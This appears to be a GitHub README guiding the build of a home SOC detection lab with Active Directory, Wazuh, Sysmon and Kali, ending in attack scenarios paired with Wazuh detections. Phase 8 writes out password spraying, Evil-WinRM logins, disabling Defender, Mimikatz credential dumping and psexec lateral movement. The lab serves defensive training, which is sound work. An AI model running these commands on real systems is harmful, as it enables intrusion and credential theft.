# Wazuh-SOC-LAB
I built an enterprise SOC lab demonstrating attack, detection, investigation, and incident response, portfolio-ready.



# Enterprise SOC Detection Lab — Detailed Build Guide

**Goal:** Build an enterprise SOC lab demonstrating attack, detection, investigation, and incident response, portfolio-ready.

**Before you start — host requirements:**
- Host machine: 32GB RAM minimum (16GB is workable but tight — you'll be running 4 VMs), 200GB+ free disk (SSD strongly preferred), CPU with virtualization extensions (VT-x/AMD-V) enabled in BIOS.
- Software: VirtualBox 7.x + VirtualBox Extension Pack (needed for USB/RDP features), 7-Zip for extracting ISOs if needed.
- Download all ISOs *before* starting Phase 1 — this saves you hours of waiting mid-build.

| VM | Purpose | RAM | vCPU | Disk |
|---|---|---|---|---|
| DC01 | Windows Server 2025 (AD DC) | 4GB | 2 | 60GB |
| WIN11 | Windows 11 Enterprise workstation | 4GB | 2 | 60GB |
| WAZUH | Ubuntu Server 24.04 (SIEM) | 8GB (4GB min, 8GB recommended for indexer) | 4 | 50GB |
| KALI | Kali Linux (attacker) | 4GB | 2 | 40GB |

---

## Phase 1 – Build the Enterprise Network

1. **Install VirtualBox + Extension Pack** on your host. Reboot after install (driver install requires it).
2. **Download ISOs first:**
   - Windows Server 2025 Evaluation (180-day) — Microsoft Evaluation Center.
   - Windows 11 Enterprise Evaluation (90-day) — Microsoft Evaluation Center (requires a free work/school-type registration).
   - Ubuntu Server 24.04 LTS — ubuntu.com/download/server.
   - Kali Linux — use the **pre-built VirtualBox OVA** from kali.org (faster than installing from ISO).
3. **Create the internal network:** You don't pre-create "SOC-LAB" anywhere globally — it's created implicitly the first time you assign a VM's network adapter to it. In VirtualBox: VM → Settings → Network → Adapter 1 → Attached to: **Internal Network** → Name: `SOC-LAB` (type it exactly the same on every VM — it's case-sensitive and must match character-for-character).
   <img width="1213" height="811" alt="Screenshot 2026-07-19 134718" src="https://github.com/user-attachments/assets/a98346a3-2a38-4a72-9863-5b8bf6cd4e1b" />

4. **Important gotcha:** Internal Network has *no DHCP and no internet access by default*. You have two options:
   - **Option A (recommended for this lab):** Keep everything fully internal/static IP, and add a **second NAT adapter** (Adapter 2) on each VM for internet access (Windows Updates, apt/pip installs, tool downloads). Traffic on Adapter 1 (internal) stays isolated; Adapter 2 (NAT) gets you online. This is the standard "airgapped-but-can-still-patch" pattern.
   - **Option B:** Use a VirtualBox "NAT Network" instead of "Internal Network," which supports inter-VM communication *and* internet access on one adapter, at the cost of being slightly less isolated. Either works — Option A is more realistic for a SOC lab.
5. **Create all 4 VMs now** (Settings only — don't install OS yet): assign RAM/CPU/disk per the table above, attach the ISO to each VM's virtual optical drive, set networking as above. Enable "Nested VT-x/AMD-V" only if your host supports it and you plan to run anything virtualized inside a VM (not required here).
6. **IP plan** (static, assign during OS install/config, not now):

| Host | IP | Role |
|---|---|---|
| DC01 | 192.168.100.10 | Domain Controller / DNS |
| WIN11 | 192.168.100.20 | Domain-joined workstation |
| KALI | 192.168.100.30 | Attacker box |
| WAZUH | 192.168.100.40 | SIEM |

Subnet mask `255.255.255.0`, no gateway needed on the internal adapter (gateway only matters on the NAT adapter, which VirtualBox handles automatically).

---

## Phase 2 – Install Windows Server 2025 (DC01)

1. Boot the VM off the ISO. Choose **Windows Server 2025 Standard (Desktop Experience)** — not Server Core; you want the GUI for this lab.
2. Custom install (not upgrade), delete/create partition on the virtual disk, let it install and reboot (it will reboot once automatically — this is normal, don't touch anything).
3. Set the local Administrator password when prompted.
4. **Rename the computer to DC01** first, *before* promoting to a DC (renaming after is more disruptive): Server Manager → Local Server → Computer name → Change → reboot.
5. **Set the static IP on the internal adapter:** Network & Internet settings (or `ncpa.cpl`) → the internal-network NIC → IPv4 properties:
   - IP: 192.168.100.10 / 255.255.255.0
   - Default gateway: leave blank (or point to nothing) on this adapter
   - Preferred DNS: **127.0.0.1** (it will be its own DNS server once AD DS is installed)
   - Leave the NAT adapter on DHCP for internet access.
   - <img width="1027" height="850" alt="NetworkAdaptor" src="https://github.com/user-attachments/assets/d08aaa00-7bc1-49eb-95fe-96a35889eb3a" />

6. **Install AD DS role:** Server Manager → Add Roles and Features → Server Roles → check "Active Directory Domain Services" → accept the feature prompts → Install.<img width="783" height="560" alt="addrolesandfeatures" src="https://github.com/user-attachments/assets/292c1f78-b331-44cb-9bc6-95b24a26e5d3" /><img width="881" height="664" alt="addrolesandfeaturesADDomainServices" src="https://github.com/user-attachments/assets/d0fd0bc2-cf1b-42e3-ad67-e0de6a6339e5" />


7. **Promote to Domain Controller:** After install finishes, click the flag/notification in Server Manager → "Promote this server to a domain controller" → **Add a new forest** → Root domain name: `SOCLAB.LOCAL` → set DSRM password (write it down somewhere safe — you'll rarely need it, but if AD breaks, you need it) → accept defaults for NetBIOS name (SOCLAB) → Install. The server will reboot automatically.<img width="953" height="715" alt="DeploymentConfiguration_Addtoanewforest" src="https://github.com/user-attachments/assets/48d3b81e-6e8e-4971-85d9-b6c96aa5057f" /> <img width="754" height="554" alt="DeploymentConfiguration_AddtoanewforestsetPW" src="https://github.com/user-attachments/assets/1ae8922c-8b35-4baa-af4c-182ac5ea11c5" />

8. **Verify:** After reboot, log in as `SOCLAB\Administrator`. Open **Active Directory Users and Computers** (dsa.msc) — you should see the SOCLAB.LOCAL domain tree. Open a command prompt and run `nslookup soclab.local` — it should resolve to itself.
9. **Create OUs first, then users** (keeps things organized for GPOs later): In ADUC, right-click the domain → New → Organizational Unit. Suggested OUs: `Employees`, `IT`, `ServiceAccounts`.
10. **Create user accounts** (ADUC → right-click OU → New → User, or faster via PowerShell):
```powershell
Import-Module ActiveDirectory
New-ADUser -Name "John Smith" -SamAccountName "John.Smith" -UserPrincipalName "John.Smith@soclab.local" -Path "OU=Employees,DC=soclab,DC=local" -AccountPassword (ConvertTo-SecureString "ChangeMe123!" -AsPlainText -Force) -Enabled $true -ChangePasswordAtLogon $true
```
Repeat for Jane.Doe, Helpdesk, ITAdmin, Accounting (adjust OU as appropriate — e.g., ITAdmin into the IT OU). Consider adding ITAdmin to **Domain Admins** for later lateral-movement scenarios, and leave the others as standard users — that privilege gap is what makes credential-theft scenarios meaningful later.
11. **Common failure point:** If DNS doesn't resolve or AD DS promotion fails, it's almost always because the static IP wasn't set *before* promotion, or DNS was pointed somewhere other than 127.0.0.1. Fix the IP/DNS and retry.

---

## Phase 3 – Windows 11 Workstation (WIN11)

1. Install Windows 11 Enterprise Evaluation normally. At the "Who's going to use this device" screen, choose **Domain join instead** if offered, or just create a local account and join the domain after install (simpler — do this).
2. Set static IP: 192.168.100.20 / 255.255.255.0, **DNS = 192.168.100.10** (this is critical — the workstation must use DC01 as DNS or domain join will fail with "cannot locate domain controller").
3. Join the domain: Settings → Accounts → Access work or school → or classic route: This PC → Properties → Advanced system settings → Computer Name → Change → Domain: `SOCLAB.LOCAL` → enter Administrator credentials when prompted → reboot.<img width="962" height="755" alt="Screenshot 2026-07-19 160407" src="https://github.com/user-attachments/assets/5b195b0e-b667-42fd-a6ba-46204bd0a960" /> <img width="600" height="600" alt="changetosoclablocal" src="https://github.com/user-attachments/assets/5ed2a80f-1049-4520-8f3c-f4114d88895d" />
4. **Verify domain join:** After reboot, the login screen should show "Other user" / `SOCLAB\username`. Log in as `John.Smith`. On DC01, in ADUC, confirm the WIN11 computer object appears under Computers. Also verify they can ping to eachother. Also might be wise to flush the dns ('ipconfig /flushdns' in CMD).
5. Install Chrome, Firefox, 7-Zip (download via the NAT adapter's internet access). Can use this for testing laterall movement later in the lab.
6. **Common failure point:** "Domain not found" during join almost always = DNS misconfigured on WIN11, or the internal-network adapter name/label doesn't actually match `SOC-LAB` on both VMs. Double check both. You may also need to enable file and printer sharing via ip4, both incoming on WIN11 machine, and outgoing for WIN2025(DC01) machine.
<img width="816" height="539" alt="Screenshot 2026-08-01 131940" src="https://github.com/user-attachments/assets/e1f97922-487f-435e-9969-360d2578ba99" />

---

## Phase 4 – Wazuh SIEM (WAZUH)

1. Install Ubuntu Server 24.04 on the WAZUH VM. During install, enable OpenSSH server (makes remote administration far easier than working in the VirtualBox console). Set a static IP via netplan or the installer's network step: 192.168.100.40.

<img width="917" height="845" alt="Screenshot 2026-08-01 151144" src="https://github.com/user-attachments/assets/269cdcc7-1718-4cf3-b03a-6199133c0fa3" />

2. Update the system first: `sudo apt update && sudo apt upgrade -y`.
3. Resource note: the Wazuh indexer (OpenSearch-based) is memory-hungry. 4GB will technically boot it but 8GB avoids random OOM kills during heavy log ingestion — bump the VM RAM now if you allocated only 4GB.
4. Use the **Wazuh quickstart all-in-one installer** (installs manager + indexer + dashboard in one go) rather than doing each component manually your first time — much lower chance of a broken cross-component config:
```bash
curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh && sudo bash ./wazuh-install.sh -a
```
(Check the current version number on the official Wazuh docs before running — the exact script name/version changes over releases.)
<img width="1005" height="303" alt="installing Wazuh on Ubunto Server" src="https://github.com/user-attachments/assets/fa94218e-bebf-4b1e-b0f3-881bed621dd4" />

5. The installer prints the **admin password for the dashboard at the end of the run** — copy it immediately, it's not shown again (you can regenerate it later with the wazuh-passwords-tool if you lose it).
7. Verify the dashboard: from your host browser, go to `https://192.168.16.2`, or whataver host-only IP address the host-only adaptor gives you. (you'll need host-to-VM connectivity — if you only have Internal Network + NAT, temporarily add a Host-Only adapter to WAZUH so your host browser can reach it, or use VirtualBox port forwarding on the NAT adapter).<img width="773" height="509" alt="hostonlyadapter" src="https://github.com/user-attachments/assets/87eb0cfe-b6c6-4c51-ae45-784ab9edfea6" />
8. You will need to make sure a host-only network is added prior to this, and then you will need to edit the same netplan as before to add this new adapter (use ip a sommand, then view new adaptor showing, should most likely read as enp0s9, add that to the netplan using sudo)
- use this command to see what netplan you are currently using (mine is '50-cloud-init.yaml'):
    - ls /etc/netplan/
- Then is this command to edit our netplan (network/adapter configuration)
      - sudo nano /etc/netplan/50-cloud-init.yaml
- The configuration I used is:
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: no
      addresses:
        - 192.168.100.40/24
    enp0s8:
      dhcp4: yes
    enp0s9:
      dhcp4: yes
      addresses:
        - 192.168.56.10/24

<img width="282" height="268" alt="Screenshot 2026-08-02 141432" src="https://github.com/user-attachments/assets/54b25155-8440-4640-95a9-e86dd0a0871b" />

9. Accept the self-signed cert warning. Log in as `admin` with the password from step

<img width="1058" height="960" alt="Screenshot 2026-08-02 141855" src="https://github.com/user-attachments/assets/4c799b67-dc4c-4e63-b8d3-e03fb7d4fbd6" />

We are in: <img width="1908" height="909" alt="WazuhDashboard" src="https://github.com/user-attachments/assets/5ccfd3c5-1f99-4ad9-958e-2a8cdf5ccd55" />

10. **Common failure point:** If the dashboard won't load, check `sudo systemctl status wazuh-dashboard wazuh-manager wazuh-indexer` — indexer failing to start is usually a memory or `vm.max_map_count` issue (the installer should set this, but verify with `sysctl vm.max_map_count`, should be ≥262144).

---

## Phase 5 – Sysmon (on DC01 and WIN11)

1. Download Sysmon from Microsoft Sysinternals (via NAT adapter internet access). <img width="715" height="674" alt="1_Sysmondownload" src="https://github.com/user-attachments/assets/d182e30d-3aa5-410a-95a8-14dbef2c7116" />

2. Download the SwiftOnSecurity `sysmonconfig-export.xml` from its GitHub repo — this is a widely-used, well-tuned baseline config that filters noise while keeping security-relevant events. <img width="979" height="632" alt="2_sysmon exportxmldownloadswiftondecurity" src="https://github.com/user-attachments/assets/cd74683b-3221-4f08-99c6-8cc5f44e25e0" />
3. Install from an elevated PowerShell/cmd prompt:
```powershell
.\Sysmon64.exe -accepteula -i sysmonconfig-export.xml
```

<img width="792" height="480" alt="3_installdriverservice_verifyservice" src="https://github.com/user-attachments/assets/57c4315e-ea2a-4fc9-961c-4ac141917059" />

4. **Verify:** Open Event Viewer → Applications and Services Logs → Microsoft → Windows → **Sysmon** → Operational. You should see Event ID 1 (process creation) entries populating as you use the machine. If the log is empty, check `Get-Service sysmon64` — it should show Running. <img width="1020" height="718" alt="4_EventViewer" src="https://github.com/user-attachments/assets/dc781c85-5240-4b80-bc83-e6520739359b" />

5. Repeat identically on WIN11.

---

## Phase 6 – Wazuh Agents (on DC01 and WIN11)

1. Open the "Deploy new agent" wizard

In the Wazuh dashboard, click the menu icon (☰) top-left → Agents management → Summary → click Deploy new agent (on some versions this path is labeled Management → Endpoints → Deploy new agent — same feature, slightly different label depending on your Wazuh version).

<img width="1134" height="577" alt="Screenshot 2026-08-02 145652" src="https://github.com/user-attachments/assets/19018e16-59d1-43e5-9c76-32883c7af31d" />

2. Fill out the wizard

Operating system: Windows
Wazuh server address: 192.168.100.40 (your WAZUH box)
Agent name: something identifiable, e.g. DC01 or WIN11 — note this cannot be changed after enrollment, so don't rush this field
Leave agent group as default unless you've already created custom groups

<img width="1146" height="823" alt="Screenshot 2026-08-02 150122" src="https://github.com/user-attachments/assets/5e083de4-7570-4eeb-bb78-987ff14e1b65" />

The wizard generates a PowerShell command with everything pre-filled. It'll look something like this (yours will have the current version number baked in — use whatever the wizard actually gives you, don't copy this verbatim):

powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.13.0-1.msi -OutFile $env:tmp\wazuh-agent.msi
msiexec.exe /i $env:tmp\wazuh-agent.msi /q WAZUH_MANAGER="192.168.100.40" WAZUH_AGENT_NAME="DC01"

3. Run the generated command on the target machine

Open PowerShell as Administrator on DC01 (or WIN11), paste the exact command the wizard gave you, and run it. The /q flag means silent install — no popups, no progress bar, it just returns to the prompt when done (this can look like nothing happened; that's normal, not a hang).

<img width="1014" height="276" alt="Screenshot 2026-08-02 151501" src="https://github.com/user-attachments/assets/da7c5196-2032-430c-a7c9-0d93fcef2c1e" />

4. Start the agent service

The installer usually starts it automatically, but confirm/force it:

powershell
NET START WazuhSvc

If it says "already started," you're good.

<img width="411" height="109" alt="Screenshot 2026-08-02 151658" src="https://github.com/user-attachments/assets/f168c94d-e83b-41e9-a819-7f6d41fe8f1e" />

5. Verify from the Windows side before checking the dashboard

powershell
Get-Service WazuhSvc
notepad "C:\Program Files (x86)\ossec-agent\ossec.log"

The log should show lines indicating a successful connection to the manager (look for Connected to the server or similar — anything repeatedly saying "Trying to connect" without ever succeeding means it's not reaching WAZUH, see troubleshooting below).

<img width="779" height="322" alt="Screenshot 2026-08-02 151859" src="https://github.com/user-attachments/assets/edc81eeb-25ea-4ce5-adfb-f437eab7e8f3" />

6. Verify from the dashboard

Back in the Wazuh dashboard, go to Agents management → Summary — your new agent should appear with status Active (it can take 30-60 seconds and a page refresh to show up).

<img width="466" height="316" alt="Screenshot 2026-08-02 152055" src="https://github.com/user-attachments/assets/5b397ffc-740e-46df-a4c7-b15d87ed6d20" />

7. Critical step — forward the Sysmon log (this is NOT automatic)

By default, the Wazuh agent ships Windows Application/System/Security logs, but not the Sysmon operational log — you have to explicitly add it. On the Windows machine:

powershell
notepad "C:\Program Files (x86)\ossec-agent\ossec.conf"

<img width="746" height="477" alt="Screenshot 2026-08-02 152311" src="https://github.com/user-attachments/assets/b292d7ec-df9c-4e73-886a-06a8d2e5b341" />

Find the <ossec_config> section that already has <localfile> blocks for Application/Security/System, and add a new one right alongside them:

xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>

<img width="678" height="281" alt="Screenshot 2026-08-02 152632" src="https://github.com/user-attachments/assets/08a11d78-ef02-450a-b49e-f66b831613e9" />

Save the file, then restart the agent service so it picks up the change:

powershell
Restart-Service -Name WazuhSvc

8. Confirm Sysmon events are actually arriving

<img width="568" height="508" alt="Screenshot 2026-08-02 152806" src="https://github.com/user-attachments/assets/32aa255b-d665-4d3b-a4d7-b16284cfab0a" />

In the dashboard, go to Threat hunting (or Security events, depending on version) → filter/search for:

data.win.system.channel: "Microsoft-Windows-Sysmon/Operational"

Then trigger something on the Windows box (open Notepad, run a command) and refresh — you should see a new event within roughly 30-60 seconds. If nothing shows up after a couple minutes, that's your sign the <localfile> block wasn't added correctly or the service didn't actually restart — reopen ossec.conf and confirm your edit saved (Notepad sometimes silently fails to save if it was opened without admin rights, even though you launched PowerShell as admin — open Notepad itself elevated, or edit via notepad.exe launched from the admin PowerShell session, which inherits the elevation).

<img width="1149" height="908" alt="Screenshot 2026-08-02 154009" src="https://github.com/user-attachments/assets/31815ba7-3f73-42cc-ac9f-8dc7f9ed641a" />

### After doing this on whichever Windows machine you chose, please repeat the steps on the other machine now (DC01 or WIN11)

Common failure points:

Agent shows "Never connected" / stuck "Pending": almost always a firewall issue. The agent needs outbound TCP 1515 (initial registration) and TCP 1514 (ongoing communication) to reach 192.168.100.40. Check Windows Firewall isn't blocking outbound, and check sudo ufw status on the WAZUH box isn't blocking inbound on those ports.
Agent connects then drops repeatedly: usually a hostname/IP mismatch — if you reinstalled WAZUH or changed its IP after agents were enrolled, old agent keys may reference a stale manager IP. Easiest fix in a lab is to remove the agent from the dashboard and re-enroll from scratch.
ossec.conf edit "doesn't work": check for a typo in the XML (unclosed tag) — a malformed ossec.conf can cause the service to silently fail to fully start. Get-Service WazuhSvc will still often show "Running" even when config parsing partially failed, so the log file (step 5) is a more reliable check than service status alone.
---

## Phase 7 – Kali Linux Setup (Attacker Box)

Installed via the official Kali ISO in VirtualBox, joined to the `SOC-LAB` internal network alongside DC01, WIN11, and WAZUH.

### Part A: Installing Kali from ISO

#### 1. Confirm which ISO variant you downloaded

Kali offers a few variants — this determines what happens during install:

- **Installer** (full offline installer, ~4GB+, most tools pre-included) — recommended, and almost certainly what you have if you grabbed the default download from kali.org/get-kali
- **NetInst** (small ISO, downloads packages during install — requires internet mid-install)
- **Live** (boots into a live desktop first; installing from there is a different flow)

If unsure, check the file size — several GB indicates the Installer image.

#### 2. Attach the ISO and boot the VM

Choose **Graphical install** at the boot menu (not "Live" or text-mode "Install").

#### 3. Work through the installer screens

- **Language/Location/Keyboard:** defaults are fine
- **Hostname:** `kali`
- **Domain name:** leave blank
- **User account:** modern Kali installers create a non-root sudo user during setup — set a username/password you'll remember; you'll use this to log in and `sudo` for everything going forward
- **Partitioning:** Guided → use entire disk → select the virtual disk → "All files in one partition" → confirm and write changes
- **Software selection:** choose **Xfce** for the desktop environment, and make sure the **default tools collection** stays checked (not just a bare desktop) — this determines whether nmap/hydra/Responder etc. are present immediately after install
- **GRUB bootloader:** install to `/dev/sda`

<img width="792" height="681" alt="Screenshot 2026-08-05 185629" src="https://github.com/user-attachments/assets/15ee5504-1491-4b05-9851-3257333d8560" />


Let it finish, remove the ISO from the virtual optical drive (VM Settings → Storage), and reboot.

#### 4. Log in and confirm access

```bash
whoami
sudo -i
```

---

<img width="947" height="634" alt="Screenshot 2026-08-05 190839" src="https://github.com/user-attachments/assets/a5b90596-8711-4fcf-bad1-8d22424867db" />
<img width="293" height="92" alt="Screenshot 2026-08-05 190828" src="https://github.com/user-attachments/assets/e0d334dc-3e23-4abf-9ef8-e7683fb1b4e1" />

### Part B: Networking

Same pattern as the WAZUH VM — one internal adapter, one NAT adapter.

#### 5. Set VM network adapters (VM powered off)

- Adapter 1 → Internal Network → `SOC-LAB`
- Adapter 2 → NAT

Boot Kali.

#### 6. Identify interfaces and set a static IP

```bash
ip a
systemctl status NetworkManager
```

**If NetworkManager is active** (typical on a desktop-flavor install), use `nmtui`:

```bash
sudo nmtui
```

Edit the internal-network interface (likely `eth0`) → IPv4 CONFIGURATION → **Manual** → Address: `192.168.100.30/24` → leave Gateway/DNS blank on this interface → OK → Activate the connection.

<img width="600" height="694" alt="Screenshot 2026-08-05 200213" src="https://github.com/user-attachments/assets/b84ff4e6-2d89-471f-8aa8-670d7c6e2f33" />

***Alternatively*** edit connections from the ethernet port icon on the upper right of Linux desktop. Keep wired connection set as Automatic and using DHCP. add other network and keep as manual, and use the ip address above (192.168.100.30/24).

<img width="685" height="536" alt="Screenshot 2026-08-05 201449" src="https://github.com/user-attachments/assets/94783146-210a-415d-abcd-c0e6e906003d" />

Leave the second interface (NAT) on Automatic/DHCP.

**If Kali is using netplan instead:**

```bash
sudo nano /etc/netplan/*.yaml
```

```yaml
network:
  version: 2
  ethernets:
    eth0:
      dhcp4: no
      addresses:
        - 192.168.100.30/24
    eth1:
      dhcp4: yes
```

```bash
sudo netplan apply
```

#### 7. Verify connectivity

```bash
ping -c 3 192.168.100.10   # DC01
ping -c 3 192.168.100.40   # WAZUH
ping -c 3 8.8.8.8          # internet
```

---

<img width="638" height="624" alt="Screenshot 2026-08-05 202435" src="https://github.com/user-attachments/assets/b3f789aa-c655-441c-8021-f802ab8f0697" />


### Part C: Update and Install Tools

#### 8. Update the system first

```bash
sudo apt update && sudo apt full-upgrade -y
```

#### 9. Check what's already installed

```bash
which nmap hydra responder crackmapexec bloodhound 2>/dev/null
```

<img width="1157" height="732" alt="Screenshot 2026-08-05 202634" src="https://github.com/user-attachments/assets/3c1656d1-e086-4e30-a871-3313c5164b05" />

Anything that returns a path is already present — skip reinstalling it.

#### 10. Use NetExec instead of (or alongside) CrackMapExec

CrackMapExec has been unmaintained since 2023. Kali still packages it for compatibility, but the actively maintained successor, **NetExec**, is the better choice for anything beyond following older tutorials verbatim:

```bash
sudo apt install -y netexec
nxc --version
```

`nxc` is the command-line entry point (`netexec` also works). CrackMapExec can still be installed alongside it if needed:

```bash
sudo apt install -y crackmapexec
```

<img width="1161" height="792" alt="Screenshot 2026-08-05 205317" src="https://github.com/user-attachments/assets/e8ac9edc-4f09-499f-803e-9fc38a1af2a4" />

#### 11. Install remaining tools

```bash
sudo apt install -y responder bloodhound neo4j
```

<img width="613" height="258" alt="Screenshot 2026-08-05 205549" src="https://github.com/user-attachments/assets/48e1b7cc-759b-44e5-96ae-8927ca476020" />

#### 12. Impacket (via pipx)

Kali's Python environment is externally managed, so a plain `pip install` will typically fail or be blocked — use `pipx`:

```bash
sudo apt install -y pipx
pipx ensurepath
pipx install impacket
```

Close and reopen the terminal after `pipx ensurepath`, then verify:

```bash
psexec.py --help
```

#### 13. Evil-WinRM

```bash
sudo gem install evil-winrm
evil-winrm --version
```

If `gem` is not found:

```bash
sudo apt install -y ruby-full ruby-dev
```

#### 14. BloodHound (requires Neo4j running first)

```bash
sudo neo4j start
```

<img width="833" height="648" alt="Screenshot 2026-08-05 205645" src="https://github.com/user-attachments/assets/26cc5ba6-60cd-4f9e-af8b-26ce7516c2c3" />

Wait 15-20 seconds for it to fully start, then open `http://localhost:7474` in a browser inside Kali (e.g. `firefox-esr &`) — log in with the default `neo4j`/`neo4j` credentials and set a new password when prompted. Then launch:

```bash
bloodhound &
```

Log into BloodHound using the Neo4j credentials just set.

#### 15. Note: SharpHound and Atomic Red Team are Windows-side

These run directly on DC01/WIN11, not on Kali — nothing to install here for these two; covered in Phase 8.

---

### Common Failure Points

| Symptom | Likely Cause / Fix |
|---|---|
| `apt install` fails with "unable to locate package" | Re-run `sudo apt update` — Kali is a rolling release and package indexes go stale quickly |
| `pip install impacket` errors with "externally managed environment" | Expected on modern Kali — use `pipx` instead of raw `pip` |
| Neo4j / BloodHound login loop | Password mismatch between Neo4j browser console and BloodHound login. Reset with `neo4j stop` then `sudo neo4j-admin dbms set-initial-password newpassword` |
| No internet during `apt update` | Confirm Adapter 2 is enabled and set to NAT |

---

## Phase 8 – Attack Scenarios

Executed from KALI (192.168.100.30) against DC01 (192.168.100.10) and WIN11 (192.168.100.20), all within the isolated `SOC-LAB` internal network. Each scenario below should be run, then confirmed in the Wazuh dashboard, before moving to the next — this keeps Phase 9/10 grounded in signals you've already seen land.

> **Before starting:** take a fresh VirtualBox snapshot of all four VMs now if you haven't already (`Phase 8 - pre-attack baseline`). Several of these scenarios are disruptive or trip AV — a snapshot means you can roll back instantly instead of rebuilding.

---

### 1. Nmap Scans

**Discovery scan** across the whole lab subnet:
```bash
nmap -sV -O 192.168.100.0/24
```

**Targeted enumeration** against each host once you know what's alive:
```bash
nmap -sC -sV -p- 192.168.100.10   # DC01 — expect AD-related ports: 53, 88, 135, 389, 445, 3268...
nmap -sC -sV -p- 192.168.100.20   # WIN11
```

`-p-` scans all 65535 ports and takes a few minutes — worth the wait for a full picture of what's exposed.

**Verify in Wazuh:** check Discover for a spike in Windows Firewall or Sysmon Event ID 3 (network connection) entries around the scan timeframe.

---

### 2. Password Spraying

**Using Hydra** against WinRM on WIN11, with a small user list and common password list:
```bash
hydra -L users.txt -P passwords.txt winrm://192.168.100.20
```
Create `users.txt` with one username per line (e.g. `John.Smith`, `Jane.Doe`, `Helpdesk`) and `passwords.txt` with a handful of common/guessable values. Keep the list small and the attempt rate low — this is meant to simulate a realistic spray, not a brute force, and gives you a cleaner signal to hunt for afterward (a handful of 4625 events, not thousands).

**Alternative using NetExec** (the actively maintained CrackMapExec successor — often cleaner output for this):
```bash
nxc smb 192.168.100.20 -u users.txt -p passwords.txt
```

**Verify in Wazuh:** filter for Windows Security Event ID 4625 (failed logon) on WIN11 — you should see one entry per spray attempt, spread across multiple usernames in a short window. That username-breadth pattern is the actual spray signature you'll hunt for in Phase 9.

---

### 3. Successful Login

Once you know (or set) a valid credential pair, connect via Evil-WinRM to confirm access:
```bash
evil-winrm -i 192.168.100.20 -u John.Smith -p 'ChangeMe123!'
```
A successful connection drops you into a PowerShell-like shell on WIN11.

**Verify in Wazuh:** Windows Security Event ID 4624 (successful logon) — note the Logon Type (3 = network, typical for WinRM) as a field you'll reference in Phase 9/11.

---

### 4. Encoded PowerShell

From the Evil-WinRM session (or any elevated session on the target), run a base64-encoded command — this specifically tests visibility into obfuscated command lines:
```powershell
powershell.exe -enc <base64string>
```
To generate a harmless test payload from Kali or any PowerShell prompt:
```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
```
Paste the resulting string in place of `<base64string>` above.

**Verify in Wazuh:** Sysmon Event ID 1 (process creation) where `CommandLine` contains `-enc` or `-EncodedCommand`. This is one of the highest-value detections in the whole lab — encoded PowerShell is a very common real-world obfuscation technique.

---

### 5. Scheduled Task Persistence

Create a scheduled task pointing at a benign binary, simulating a persistence mechanism:
```powershell
schtasks /create /tn "UpdateCheck" /tr "C:\Windows\System32\calc.exe" /sc onlogon /ru SYSTEM
```

**Verify in Wazuh:** Sysmon Event ID 1 (process creation) for `schtasks.exe`, and Windows Security Event ID 4698 (a scheduled task was created) — the latter requires "Audit Other Object Access Events" to be enabled in the domain's audit policy if it isn't already; check Group Policy / local security policy on DC01 if 4698 doesn't appear.

---

### 6. Credential Dumping (Mimikatz)

**Download** the latest release directly on the Windows target (WIN11 or DC01):
```
https://github.com/gentilkiwi/mimikatz/releases/latest
```
Grab the zip asset, extract it — you'll get `Win32` and `x64` folders.

**Before running it:** Windows Defender will almost certainly flag and quarantine Mimikatz on sight — it's one of the most heavily signatured tools that exists. Since the goal here is to observe *Sysmon's* detection of LSASS access (not to test AV evasion), temporarily disable real-time protection for this test:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
Remember to re-enable it afterward:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

**Run it** from an elevated prompt:
```powershell
cd C:\Path\To\mimikatz\x64
.\mimikatz.exe
```
Inside the Mimikatz console:
```
privilege::debug
sekurlsa::logonpasswords
```
`privilege::debug` should return `OK` — if it doesn't, you're not running elevated. `sekurlsa::logonpasswords` dumps credentials of logged-on users from LSASS memory.

**Verify in Wazuh:** Sysmon Event ID 10 (ProcessAccess) where `TargetImage` contains `lsass.exe` — this is the core detection for this entire technique, and one of the most important ones in the lab.

---

### 7. Lateral Movement

**Using Evil-WinRM** to pivot from Kali directly to another host with captured/known credentials:
```bash
evil-winrm -i 192.168.100.10 -u ITAdmin -p 'ChangeMe123!'
```

**Using Impacket's psexec.py** for a more classic lateral-movement technique (creates and runs a service remotely):
```bash
psexec.py SOCLAB/ITAdmin:'ChangeMe123!'@192.168.100.10
```

**Verify in Wazuh:** for PsExec-style movement, look for Windows Security Event ID 7045 (a new service was installed) and Sysmon Event ID 1 for the resulting spawned process — psexec-style tools have a distinctive parent/child signature worth noting for Phase 9.

---

### 8. Atomic Red Team Simulations

Run these **on the Windows target itself** (installed back in Phase 7's Kali setup note — actually installed on DC01/WIN11, not Kali):
```powershell
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
```

**Credential dumping technique** (maps directly to the Mimikatz scenario above, useful as a second data point):
```powershell
Invoke-AtomicTest T1003.001
```

**Scheduled task technique** (second data point for scenario 5 above):
```powershell
Invoke-AtomicTest T1053.005
```

Running the same technique two ways (manually, and via Atomic Red Team) is a good way to confirm your detection isn't accidentally keyed to something incidental about one specific tool's behavior.

**Verify in Wazuh:** same event IDs as the corresponding manual scenario above — confirm both trigger identically.

---

### MITRE ATT&CK Reference Table

Useful to carry forward into Phase 10 (Detection Engineering) and Phase 11 (Incident Response documentation) so every scenario has its technique ID ready to go.

| Scenario | Technique ID | Tactic |
|---|---|---|
| Nmap scans | T1046 | Discovery |
| Password spraying | T1110.003 | Credential Access |
| Successful login | T1078 | Initial Access / Persistence |
| Encoded PowerShell | T1059.001 | Execution |
| Scheduled task persistence | T1053.005 | Persistence |
| Credential dumping (Mimikatz) | T1003.001 | Credential Access |
| Lateral movement (PsExec/Evil-WinRM) | T1021.002 / T1021.006 | Lateral Movement |

---

### Common Failure Points

| Symptom | Likely Cause / Fix |
|---|---|
| Hydra returns nothing / all failures against WinRM | Confirm WinRM is enabled on the target: `Enable-PSRemoting -Force` (run once on WIN11/DC01) |
| Evil-WinRM connects but immediately drops | Usually a WinRM auth type mismatch — confirm the account isn't locked out from the earlier spray |
| Mimikatz binary disappears right after extraction | Defender quarantined it — check Windows Security → Protection history, restore, and disable real-time protection first next time |
